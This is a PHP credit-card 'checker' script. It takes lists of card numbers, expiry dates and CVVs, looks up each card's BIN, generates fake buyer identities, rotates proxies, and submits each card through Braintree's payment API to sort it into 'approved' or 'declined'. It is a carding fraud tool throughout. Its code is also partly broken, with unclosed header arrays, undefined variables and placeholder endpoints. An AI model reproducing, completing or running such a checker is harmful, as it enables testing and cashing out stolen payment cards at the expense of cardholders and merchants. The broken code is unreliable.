<?php


error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//==================[BIN LOOK-UP]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[BIN LOOK-UP]======================//
$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
//==================[BIN LOOK-UP-END]======================//


//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array()
'Accept: */*',
'Accept-Language: en-US,en;q=0.9',
'Authorization: ...',
'Braintree-Version: ...',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: payments.braintree-api.com',
'Origin: https://assets.braintreegateway.com',
'Referer: https://assets.braintreegateway.com/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: cross-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');


curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"token": "','"')));
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_URL, '#');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: ....',
'accept: .....',
'accept-language: en-US,en;q=0.9',
'content-type: .....',
'cookie: .....',
'origin: ....',
'referer: ....',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
'x-requested-with: XMLHttpRequest',
curl_setopt($ch, CURLOPT_POSTFIELDS,'#');
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//

//===========================================[Responses]========================================//

if(strpos($result2, 'Do Not Honor')){
echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Do Not Honor] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Processor Declined')){
echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Processor Declined] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Card Issuer Declined CVV')){
echo '<span class="badge badge-success">[✅ Aprovada] CCN</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Card Issuer Declined CVV] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Insufficient Funds')){
echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Insufficient Funds] [C-B:- @ccChecker_scripts]</span>';
}
elseif ((strpos($result2, "Thank ")) || (strpos($result2, "Success ")) || (strpos($result2, "succeeded"))){ 
echo '<span class="badge badge-success">[✅ APPROVED!] CVV</span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- CHARGED CVV] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Transaction Not Allowed')){
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Transaction Not Allowed] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Declined')){
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Declined] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Invalid Credit Card Number')){
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Invalid Credit Card Number] [C-B:- @ccChecker_scripts]</span>';
}
elseif(strpos($result2, 'Expired Card')){
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Expired Card] [C-B:- @ccChecker_scripts]</span>';
}
elseif(!$result2){
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Proxy Dead/Error Not Listed] [C-B:- @ccChecker_scripts]</span>';
}
else{
echo '<span class="badge badge-success">[❌ Declined] </span><span class="badge badge-success">'.$lista.'</span><span class="badge badge-info"> [' . $type . '-' . $brand . '-' . $bank . '-' . $name1 . '-' . $bin . '] [R- Declined] [C-B:- @ccChecker_scripts][Result:- ]</span>';
}
//===========================================[Responses-END]========================================//

curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";


?>
